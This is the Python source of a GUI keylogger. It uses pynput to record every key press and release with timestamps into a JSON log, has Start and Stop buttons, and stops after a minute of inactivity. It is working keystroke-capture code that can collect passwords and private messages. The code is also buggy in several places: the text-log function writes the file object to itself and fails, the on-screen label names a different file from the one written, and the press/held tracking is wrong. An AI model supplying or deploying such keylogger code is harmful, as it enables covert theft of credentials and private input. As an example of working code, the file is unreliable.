import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import time
from threading import Timer

keys_used = []
flag = False
keys = ""
last_activity_time = time.time()

# Function to log a key event
def log_key_event(event_type, key):
    keys_used.append({
        'Timestamp': time.time(),
        'Event': event_type,
        'Key': str(key)
    })

# Function to generate a JSON log file
def generate_json_file():
    with open('key_log.json', 'w') as key_log:
        json.dump(keys_used, key_log)

# Function to generate a text log file
def generate_text_log():
    with open('key_log.txt', 'a') as keys:
        keys.write(keys)

# Callback function for key press event
def on_press(key):
    global flag, last_activity_time

    if isinstance(key, keyboard.KeyCode):
        if flag == False:
            log_key_event('Pressed', key)
            flag = True

        if flag == True:
            log_key_event('Held', key)

    last_activity_time = time.time()

# Callback function for key release event
def on_release(key):
    global flag
    if isinstance(key, keyboard.KeyCode):
        log_key_event('Released', key)
        if flag == True:
            flag = False

    generate_json_file()
    generate_text_log()

# Function to start the keylogger
def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

    # Start the activity detection timer
    activity_timer()

# Function to stop the keylogger
def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

# Function to detect user activity and pause logging if there's inactivity
def activity_timer():
    global last_activity_time
    inactivity_threshold = 60  # In seconds (adjust as needed)

    if time.time() - last_activity_time >= inactivity_threshold:
        stop_keylogger()
    else:
        # Check again after 1 second
        Timer(1, activity_timer).start()

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x250")

root.mainloop()
